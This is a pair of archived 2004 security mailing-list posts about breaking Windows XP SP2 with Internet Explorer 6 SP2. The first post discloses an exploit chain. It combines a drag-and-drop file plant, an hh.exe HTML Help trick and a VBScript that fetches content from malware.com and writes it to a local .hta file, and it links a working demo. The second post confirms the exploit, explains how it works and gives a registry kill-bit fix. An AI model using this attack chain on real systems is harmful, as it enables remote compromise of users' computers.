=== Content from marc.info_3f204762_20250125_133513.html ===

```
[[prev in list](?l=ntbugtraq&m=109828089328478&w=2)] [[next in list](?l=ntbugtraq&m=109828020004181&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=109830296130857&w=2)]
List:       [ntbugtraq](?l=ntbugtraq&r=1&w=2)
Subject:    [How to Break Windows XP SP2 + Internet Explorer 6 SP2](?t=109828081200006&r=1&w=2)
From:       ["http-equiv () excite ! com" <1 () MALWARE ! COM>](?a=105180760400003&r=1&w=2)
Date:       [2004-10-20 3:35:44](?l=ntbugtraq&r=1&w=2&b=200410)
Message-ID: [200410200335.i9K3Zi72007862 () web186 ! megawebservers ! com](?i=200410200335.i9K3Zi72007862%20()%20web186%20!%20megawebservers%20!%20com)
[Download RAW [message](?l=ntbugtraq&m=109828076802478&q=mbox) or [body](?l=ntbugtraq&m=109828076802478&q=raw)]

Tuesday,  October 19, 2004

The following technical exercise demonstrates the enormously
elaborate methods required to defeat the current [as of today's
date] security mechanisms in place in both Microsoft Windows XP
SP2 and Internet Explorer 6.00 SP2 fully
patched:

It is by no means easy. The 'locking down 'of the local zone is
and has been the 'Achilles' Heel' of the manufacturer known as
Microsoft from time of inception to date.

What we craft herewith is:

a) an enormous waste of personal resources and time
be) a full and complete remote compromise of the target computer

It is sufficiently diluted to allow for technical explanation at
this time, however, considering that today 'full fireworks' from
the get-go appear to be mundane to those that need, or pretend,
to need to know, brighter sparks may or may not 'see the light' !

The problem is three-fold:

The SP2 'patch' for the Microsoft XP so-called 'operating
system' does indeed do a terrific job of shutting out all Active
Content from the so-called Local Zone. So much so as to , in
addition to that aspect, killing off of the ADODB.Stream and
Shell.Application [very] ActiveX controls.

The questions then are:

a) if we can run code in the local zone, what can we run to
read, write and delete
b) if we can run code that can read, write and delete, how
exactly do we run it

Like so:

1/  The recent  'drag drop' patch crammed into the Internet
Explorer so-called 'Cumulative Security Update for Internet
Explorer (834707)' yields some interesting results

2/ Clearly the mechanism to put anything other than the intended
MIME type in the src or dynsrc has been bolstered. Almost to the
point of being a specific set of file types. One might suspect
the capabilities of the newly enriched 'snot nosed' security of
Internet Explorer is called into play:

A

a) .xml;.doc;.py;.cdf;.css;.pdf;ppt and a number of others
prove 'draggable'. Key or 'executable' file types do not -- for
obvious reasons [now].

b) the 'trick' is then to emulate these file types. Quite
correctly Internet Explorer 'sniffs' the file type to ensure its
being. From within. Draggable elements are quite limited. As
in <img src=''...> or <img dynsrc=''...> meaning only legitimate
files assigned can be dragged -- media or image.

c) What we do is inject our html code into the media file,
remove the file type [extention] and let the machine do our
dirty work first step for us

d) Dragging our 'trojaned' image file across, containing our
arbitrary code, we remove the extension and the machine
automagically creates a nice crisp .htm file

e) Big deal they say. Cannot run code in the 'Local Zone'. We
then take an oddity with our most helpful Help function from the
operating system known as hh.exe. By giving this a non-valid or
miss-formed 'window' we are able to then point hh.exe to our
machine made [inclusive of our arbitrary code] .htm file and
execute that within Windows Help. What that means is that this
is not a trivial 'showHelp()' rather an actual .chm opening via
hh.exe remotely. In technical essence that is. Along with its
With pseudo privileges no doubt.

f) Big deal they say. Cannot run read / write / delete/ code in
the 'Local Zone'. Adodb.Stream is dead. Shell.Application is
dead. WScript.Shell has been patched even longer than that. But,
we magically craft new code to replace it like so:

<script language="vbs">
'<http://www.malware.com> - 19.10.04
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=<http://www.malware.com;>" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from foobar.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from foobar.txt", conn
rs.Save "C:\\WINDOWS\\PCHealth\\malware.hta", adPersistXML
rs.close
conn.close
</script>

Simply put, that is perhaps the last remaining 'piece of code'
that can write arbitrary content to an arbitrary file name in an
aribitrary location.

All it is doing is pulling from malware.com, the contents of a
miserable text file, then writing that content to an .hta file
in the location we tell it to. On the local machine.

Working Diluted Manual Demo [go make your own fireworks !]:

<http://www.malware.com/noceegar.html>

Notes:

1. the entire process could be automated should one really have
time to waste
2. current so-called 'professional' trends are inclined to "so
what. If it cannot bake toast as well who cares"
3. Exactly. Who really cares !
4. Do you.

End Call

--
<http://www.malware.com>

--
NTBugtraq Editor's Note:

Want to reply to the person who sent this message? This list is configured such that \
just hitting reply is going to result in the message coming to the list, not to the \
individual who sent the message. This was done to help reduce the number of Out of \
Office messages posters received. So if you want to send a reply just to the poster, \
you'll have to copy their email address out of the message and place it in your TO: \
                field.
--

[[prev in list](?l=ntbugtraq&m=109828089328478&w=2)] [[next in list](?l=ntbugtraq&m=109828020004181&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=109830296130857&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_65372478_20250125_133511.html ===

```
[[prev in list](?l=bugtraq&m=109829680513714&w=2)] [[next in list](?l=bugtraq&m=109830767725572&w=2)] [[prev in thread](?l=bugtraq&m=109830296130857&w=2)] [[next in thread](?l=ntbugtraq&m=109881100401170&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [RE: How to Break Windows XP SP2 + Internet Explorer 6 SP2](?t=109828081200006&r=1&w=2)
From:       ["Thor Larholm" <thor () pivx ! com>](?a=102632004200001&r=1&w=2)
Date:       [2004-10-20 15:07:10](?l=bugtraq&r=1&w=2&b=200410)
Message-ID: [653D74053BA6F54A81ED83DCF969DF08854617 () pivxes1 ! pivx ! com](?i=653D74053BA6F54A81ED83DCF969DF08854617%20()%20pivxes1%20!%20pivx%20!%20com)
[Download RAW [message](?l=bugtraq&m=109829111200055&q=mbox) or [body](?l=bugtraq&m=109829111200055&q=raw)]

I successfully reproduced this exploit on a fully patched XPSP2
installation and can verify that malware.htm is planted locally after
which HTML Help is used to launch it and circumvent the XPSP2 browser
security improvements, compromising the system.

However, this exploit did not work on any systems with Qwik-Fix Pro
installed, from Windows 95 to Windows XP Service Pack 2. A free Home
edition and a trial Corporate edition is available for download at

<http://www.pivx.com/qwikfixDownload.asp>

Before you can successfully use any Drag'n'Drop technique or script
shortcuts to plant a file on the local system you first need to be able
to reference local content. If you cannot reference local contents or
directories from the Internet zone then you cannot retrieve the window
handle that is necessary for any Drag'n'Drop exploits or any
cross-domain scripting exploits.

IE6SP1 initially blocked all direct references to the FILE:// and RES://
protocols which I demonstrated how to circumvent through the OBJECT
element. This was quickly patched in the next cumulative security update
and thereby blocked the traditional cross-domain scripting exploits.
XPSP2 went further and tightened down the Local Machine Zone with the
recommendations PivX Labs made public in late 2003 so that even if you
could find a way to reference local content and subsequently inject
scripting through a cross-domain vulnerability you would not be able to
accomplish anything. This LMZ lockdown has a per-process exception list
in which HTML Help is included.

When the LMZ is locked down attackers have to find alternative attack
vectors, of which the Drag'n'Drop vulnerability is a prime example. When
IE renders an IMG element it gives priority to the SRC attribute but
when IE drops an IMG element on an arbitrary window it gives priority to
the DYNSRC attribute. If you are able to reference any local content you
can therefore drop the DYNSRC attribute of the IMG element on the window
with local content and thereby plant a file on the file system in a
known location.

The browser security improvements in XPSP2 does not include further
restrictions on referencing local content which is why the Drag'n'Drop
exploits to this date affect fully patched XPSP2 systems. Qwik-Fix Pro
restricts local content referencing through a number of means of which
one is responsible for protecting against this exploit:

In order for http-equiv's exploit to work the "ceegar.html" file uses
the AnchorClick behavior to open "C:\WINDOWS\PCHealth\" in a named
window which is then used as a drop target for the DYNSRC pointing to
the "malwarez" file. When any behavior in IE tries to list a local
directory it uses the Shell.Explorer ActiveX object, an object which has
no justification of use inside the browser but which is heavily used by
Windows Explorer itself.

Setting the Kill Bit on the Shell.Explorer ActiveX object prevents IE
from referencing local directories in a window object, whether it's
through AnchorClick behavior or some other approach that we discover
tomorrow. The GUID for Shell.Explorer is
{8856F961-340A-11D0-A96B-00C04FD705A2} and Knowledge Base article 240797
(<http://support.microsoft.com/?kbid=240797> ) explains how the process
works.

PivX Labs released a freely available registry fix that sets the Kill
Bit on Shell.Explorer almost 2 months ago which can be downloaded from

<http://www.pivx.com/research/freefixes/neutershellexplorer.reg>

For clarity, here are the file contents:

=== neutershellexplorer.reg ===
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX
Compatibility\{8856F961-340A-11D0-A96B-00C04FD705A2}]
"Compatibility Flags"=dword:00000400
=== neutershellexplorer.reg ===

PivX Labs has covered this topic several times before on the Unpatched
mailing list which receives advance notification of our security
research, including several Win95-XPSP2 vulnerabilities that will be
released in the interim future. For more information or to subscribe you
can visit

<http://unpatched.pivxlabs.com>

Regards

Thor Larholm
Senior Security Researcher
PivX Solutions
23 Corporate Plaza #280
Newport Beach, CA 92660
<http://www.pivx.com>
thor@pivx.com
Stock symbol: (PIVX.OB)
Phone: +1 (949) 231-8496
PGP: 0x4207AEE9
B5AB D1A4 D4FD 5731 89D6  20CD 5BDB 3D99 4207 AEE9

PivX defines a new genre in Desktop Security: Proactive Threat
Mitigation.
<<http://www.pivx.com/qwikfix>>

-----Original Message-----
From: Windows NTBugtraq Mailing List
[mailto:NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM] On Behalf Of
http-equiv@excite.com
Sent: Wednesday, October 20, 2004 5:36 AM
To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
Subject: How to Break Windows XP SP2 + Internet Explorer 6 SP2

Snip
<http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0410&L=ntbugtraq>
&F=P&S=&P=10781

Snip <http://tinyurl.com/4xeww>

[[prev in list](?l=bugtraq&m=109829680513714&w=2)] [[next in list](?l=bugtraq&m=109830767725572&w=2)] [[prev in thread](?l=bugtraq&m=109830296130857&w=2)] [[next in thread](?l=ntbugtraq&m=109881100401170&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


